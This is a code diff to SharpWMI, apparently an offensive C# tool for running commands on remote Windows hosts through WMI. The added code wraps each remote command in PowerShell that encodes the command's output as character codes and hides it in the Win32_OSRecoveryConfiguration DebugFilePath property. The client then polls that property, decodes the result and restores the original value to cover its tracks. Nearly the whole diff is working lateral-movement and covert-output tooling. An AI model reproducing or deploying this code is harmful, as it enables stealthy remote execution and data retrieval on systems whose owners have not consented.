@@ -1,7 +1,7 @@
 ﻿using System;
 using System.Collections.Generic;
 using System.Management;
-
+using System.Threading;
 namespace SharpWMI
 {
     class Program
@@ -108,7 +108,7 @@ Set objFileToWrite = Nothing
             }
             catch (Exception ex)
             {
-                Console.WriteLine(String.Format("  Exception : {0}", ex.Message));
+                Console.WriteLine(String.Format("[X] Exception {0}", ex.Message));
             }
         }
 
@@ -155,29 +155,94 @@ Set objFileToWrite = Nothing
             }
             catch (Exception ex)
             {
-                Console.WriteLine(String.Format("  Exception : {0}", ex.Message));
+                Console.WriteLine(String.Format("[X] Exception : {0}", ex.Message));
             }
         }
+        static string GetWMIProperty(string host, string username, string password)
+        {
+            string wmiNameSpace = "root\\cimv2";
+            ConnectionOptions options = new ConnectionOptions();
+            if (!String.IsNullOrEmpty(username))
+            {
+                options.Username = username;
+                options.Password = password;
+            }
+            ManagementScope scope = new ManagementScope(String.Format("\\\\{0}\\{1}", host, wmiNameSpace), options);
+            string wmiQuery = @"SELECT DebugFilePath FROM Win32_OSRecoveryConfiguration";
+            try
+            {
+                scope.Connect();
+                ObjectQuery query = new ObjectQuery(wmiQuery);
+                string WMIProperty = "";
+                ManagementObjectSearcher searcher = new ManagementObjectSearcher(scope, query);
+                ManagementObjectCollection data = searcher.Get();
+                foreach (ManagementObject result in data)
+                {
+                    System.Management.PropertyDataCollection props = result.Properties;
+                    foreach (System.Management.PropertyData prop in props)
+                    {
+                        WMIProperty = prop.Value.ToString();
+                    }
+
+                }
+                return WMIProperty;
+            }
+            catch (Exception ex)
+            {
+                return "";
+            }
+           
+        }
+
+        static void SetWMIProperty(string host, string username, string password, string newvalue)
+        {
+            string wmiNameSpace = "root\\cimv2";
+            ConnectionOptions options = new ConnectionOptions();
+            if (!String.IsNullOrEmpty(username))
+            {
+                options.Username = username;
+                options.Password = password;
+            }
+            ManagementScope scope = new ManagementScope(String.Format("\\\\{0}\\{1}", host, wmiNameSpace), options);
+            ManagementClass configClass = new ManagementClass(scope, new ManagementPath("Win32_OSRecoveryConfiguration"), null);
+            ManagementObjectCollection MyCollection = configClass.GetInstances();
+            try
+            {
+                foreach (ManagementObject MyObject in MyCollection)
+                {
+                    MyObject.SetPropertyValue("DebugFilePath", newvalue);
+                    MyObject.Put();
+                }
+                Console.WriteLine("[*] Done!");
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("[X] Exception in recovery: {0}", ex.Message);
+                return;
+            }
+           
+        }
+
 
         static void RemoteWMIExecute(string host, string command, string username, string password)
         {
             string wmiNameSpace = "root\\cimv2";
-
             ConnectionOptions options = new ConnectionOptions();
 
-            Console.WriteLine("\r\n  Host                           : {0}", host);
-            Console.WriteLine("  Command                        : {0}", command);
+            Console.WriteLine("\r\n[*] Host                           : {0}", host);
+            Console.WriteLine("[*] Command                        : {0}", command);
 
+          
             if (!String.IsNullOrEmpty(username))
             {
-                Console.WriteLine("  User credentials               : {0}", username);
+                Console.WriteLine("[*] User credentials               : {0}", username);
                 options.Username = username;
                 options.Password = password;
             }
-            Console.WriteLine();
-
+           
             ManagementScope scope = new ManagementScope(String.Format("\\\\{0}\\{1}", host, wmiNameSpace), options);
-
+            // Store data in existing WMI property, but keep original value
+            string Original_WMIProperty = GetWMIProperty(host,username,password);
             try
             {
                 scope.Connect();
@@ -186,19 +251,44 @@ Set objFileToWrite = Nothing
 
                 ManagementBaseObject inParams = wmiProcess.GetMethodParameters("Create");
                 System.Management.PropertyDataCollection properties = inParams.Properties;
-
-                inParams["CommandLine"] = command;
-
+                string tmpcmd = String.Format("$output = ({0} | Out-String).Trim(); $EncodedText = [Int[]][Char[]]$output -Join ','; $a = Get-WmiObject -Class Win32_OSRecoveryConfiguration; $a.DebugFilePath = $EncodedText; $a.Put()",command);
+                inParams["CommandLine"] = "powershell " + tmpcmd;      
                 ManagementBaseObject outParams = wmiProcess.InvokeMethod("Create", inParams, null);
 
-                Console.WriteLine("  Creation of process returned   : {0}", outParams["returnValue"]);
-                Console.WriteLine("  Process ID                     : {0}\r\n", outParams["processId"]);
+
+                Console.WriteLine("[*] Creation of process returned   : {0}", outParams["returnValue"]);
+                Console.WriteLine("[*] Process ID                     : {0}", outParams["processId"]);
+
+                while (true)
+                {
+                    string New_WMIProperty = GetWMIProperty(host, username, password);
+                    if (New_WMIProperty == Original_WMIProperty)
+                    {
+                        Console.WriteLine("[*] Tring get result...");
+                        Thread.Sleep(3000);
+                    }
+                    else
+                    {
+                        string[] tmp = New_WMIProperty.Split(',');
+                        string result = "";
+                        foreach (string i in tmp)
+                        {
+                            result += Convert.ToChar(Convert.ToInt32(i));
+                        }
+                        Console.WriteLine("[+] Execute result:\r\n\r\n {0}\r\n", result);
+                        break;
+                    }
+                }
+                Console.WriteLine("[*] Recovery WMI Property..");
+                SetWMIProperty(host, username, password, Original_WMIProperty);
             }
             catch (Exception ex)
             {
-                Console.WriteLine(String.Format("  Exception : {0}", ex.Message));
+                Console.WriteLine(String.Format("[X] Exception : {0}", ex.Message));
             }
         }
+
+
 
         static void RemoteWMIExecuteVBS(string host, string eventName, string username, string password)
         {
@@ -336,7 +426,7 @@ Set objFileToWrite = Nothing
             }
             catch (Exception ex)
             {
-                Console.WriteLine(String.Format("  Exception : {0}", ex.Message));
+                Console.WriteLine(String.Format("[X] Exception {0}", ex.Message));
             }
         }
 
